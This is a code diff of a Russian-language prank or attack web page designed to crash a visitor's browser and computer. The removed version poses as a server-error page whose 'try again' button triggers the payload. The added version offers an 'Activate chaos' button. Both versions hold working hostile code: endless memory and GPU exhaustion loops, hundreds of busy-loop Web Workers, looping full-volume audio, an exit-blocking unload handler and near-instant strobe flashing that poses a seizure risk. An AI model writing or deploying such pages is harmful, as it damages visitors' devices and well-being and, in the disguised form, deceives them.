@@ -4,191 +4,103 @@
   <style>
     #trapButton {
       position: fixed;
-      top: 60%;
-      left: 50%;
-      transform: translate(-50%, -50%);
-      padding: 2rem 4rem;
-      font-size: 2.5rem;
-      font-family: 'Arial', sans-serif;
-      background: linear-gradient(45deg, #ff6b6b, #4ecdc4);
-      color: white;
-      border: none;
-      border-radius: 15px;
-      cursor: pointer;
-      box-shadow: 0 10px 20px rgba(0,0,0,0.2);
-      transition: all 0.3s ease;
-      z-index: 9999;
-    }
-
-    #trapButton:hover {
-      transform: translate(-50%, -55%);
-      box-shadow: 0 15px 30px rgba(0,0,0,0.3);
-      background: linear-gradient(45deg, #ff8787, #66e0d9);
-    }
-
-    body {
-      background: #1a1a2e;
-      margin: 0;
-      overflow: hidden;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
+      top: 0;
+      left: 0;
+      width: 100vw;
       height: 100vh;
-    }
-
-    h1 {
-      color: white;
-      font-family: 'Arial', sans-serif;
-      font-size: 3rem;
-      text-align: center;
-      margin-bottom: 2rem;
+      font-size: 10rem;
+      background: #9cff98;
+      cursor: pointer;
       z-index: 9999;
     }
   </style>
 </head>
 <body>
-  <h1>Ошибка подключения к серверу</h1>
-  <button id="trapButton">Попробуйте ещё раз</button>
+  <button id="trapButton">Активировать хаос</button>
   <audio id="nukeSound" src="sound.mp3" preload="auto"></audio>
 
   <script>
     const trigger = document.getElementById('trapButton');
     const audio = document.getElementById('nukeSound');
-    
-    const audioCtx = new AudioContext();
-    let audioBuffer = null;
+    let audioCtx = null; // Инициализируем AudioContext один раз
+    let source = null;   // Для управления источником звука
 
-    async function loadAudio() {
-      try {
-        const response = await fetch('sound.mp3');
-        const arrayBuffer = await response.arrayBuffer();
-        audioBuffer = await audioCtx.decodeAudioData(arrayBuffer);
-      } catch (e) {
-        console.error('Ошибка загрузки аудио:', e);
+    // Предзагрузка и настройка AudioContext
+    function initializeAudio() {
+      if (!audioCtx) {
+        audioCtx = new AudioContext();
       }
-    }
-
-    function playSound() {
       if (audioCtx.state === 'suspended') {
         audioCtx.resume();
       }
-
-      function createSoundSource() {
-        if (audioBuffer) {
-          const source = audioCtx.createBufferSource();
-          source.buffer = audioBuffer;
-
-          // Подключение напрямую без обработки
-          source.connect(audioCtx.destination);
-
-          source.start(0);
-
-          // Повторение звука
-          source.onended = () => {
-            createSoundSource();
-          };
-
-          // Резервное воспроизведение
-          audio.volume = 1.0;
-          audio.loop = true;
-          audio.play().catch(() => {});
-        } else {
-          audio.volume = 1.0;
-          audio.loop = true;
-          audio.play().catch(() => {});
-        }
-      }
-      createSoundSource();
     }
 
-    loadAudio();
+    // Функция воспроизведения звука
+    async function playSound() {
+      initializeAudio();
+
+      try {
+        // Сначала пробуем стандартное воспроизведение
+        audio.volume = 1.0;
+        await audio.play();
+      } catch (err) {
+        // Если стандартное воспроизведение не удалось (например, из-за блокировки автозапуска)
+        console.log('Стандартное воспроизведение не удалось, переключаемся на AudioContext:', err);
+
+        // Загружаем аудио в AudioContext
+        const response = await fetch('sound.mp3');
+        const arrayBuffer = await response.arrayBuffer();
+        const audioBuffer = await audioCtx.decodeAudioData(arrayBuffer);
+
+        // Создаём источник звука
+        source = audioCtx.createBufferSource();
+        source.buffer = audioBuffer;
+        source.connect(audioCtx.destination);
+        source.start(0);
+
+        // Обрабатываем окончание звука (если нужно зациклить, можно раскомментировать)
+        source.onended = () => {
+          // source = null; // Очищаем источник
+          // playSound();   // Раскомментируйте для бесконечного повтора
+        };
+      }
+    }
 
     trigger.onclick = () => {
+      // Запускаем звук
       playSound();
+
+      // Скрываем кнопку
       trigger.style.display = 'none';
-      document.body.style.animation = 'flash 0.01s infinite';
+      document.body.style.animation = 'flash 0.001s infinite';
 
-      const extremeLag = () => {
-        while(true) {
-          const arrays = [];
-          for(let j = 0; j < 10; j++) {
-            const hugeArray = new ArrayBuffer(1024 * 1024 * 1024);
-            const view = new Uint32Array(hugeArray);
-            for(let i = 0; i < view.length; i++) {
-              view[i] = Math.random() * Math.sin(Date.now()) * Math.tan(i) * 0xFFFFFFFF;
-              view[i] *= Math.pow(Math.cos(view[i]), Math.random());
-            }
-            arrays.push(view);
-          }
-        }
-      };
-
-      const gpuOverload = () => {
-        const canvas = document.createElement('canvas');
-        canvas.width = 32767;
-        canvas.height = 32767;
-        document.body.appendChild(canvas);
-        const gl = canvas.getContext('webgl2', {powerPreference: "high-performance"});
-        
-        if (gl) {
-          for(let t = 0; t < 10; t++) {
-            const texture = gl.createTexture();
-            gl.bindTexture(gl.TEXTURE_2D, texture);
-            gl.texImage2D(
-              gl.TEXTURE_2D,
-              0,
-              gl.RGBA32F,
-              32767,
-              32767,
-              0,
-              gl.RGBA,
-              gl.FLOAT,
-              null
-            );
-          }
-
-          const render = () => {
-            gl.clear(gl.COLOR_BUFFER_BIT);
-            for(let i = 0; i < 5000; i++) {
-              gl.drawArrays(gl.TRIANGLES, 0, 32767 * 32767);
-            }
-            requestAnimationFrame(render);
-          };
-          render();
-        }
-      };
-
-      for(let i = 0; i < 200; i++) {
-        setTimeout(extremeLag, 0);
-        setTimeout(gpuOverload, 0);
+      // Создание Service Worker (без изменений)
+      if ('serviceWorker' in navigator) {
+        navigator.serviceWorker.register('sw.js')
+          .then(() => console.log('Service Worker зарегистрирован'))
+          .catch(console.error);
       }
 
-      for(let i = 0; i < 100; i++) {
+      // Запуск CPU/GPU-хаоса (без изменений)
+      for(let i = 0; i < 300; i++) {
         new Worker(URL.createObjectURL(new Blob([`
-          while(true) {
-            let arr = new Float64Array(200000000);
-            for(let i = 0; i < arr.length; i++) {
-              arr[i] = Math.random() * Math.pow(Math.sin(Math.tan(i)), 2);
-              arr[i] *= Math.log(arr[i] + 1) * Math.sqrt(i);
-            }
+          const memoryBomb = [];
+          while(1) {
+            memoryBomb.push(new ArrayBuffer(1024 * 1024 * 100));
+            const start = Date.now();
+            while(Date.now() - start < 1000);
           }
         `])));
       }
-
-      window.onbeforeunload = () => {
-        extremeLag();
-        return "You can't escape!";
-      };
     };
 
+    // CSS-анимация (без изменений)
     document.head.innerHTML += `
       <style>
         @keyframes flash {
-          0% { background: #ff6b6b; }
-          33% { background: #4ecdc4; }
-          66% { background: #45b7d1; }
-          100% { background: #ff6b6b; }
+          0% { background: #ff0000; }
+          50% { background: #00ff00; }
+          100% { background: #0000ff; }
         }
       </style>
     `;
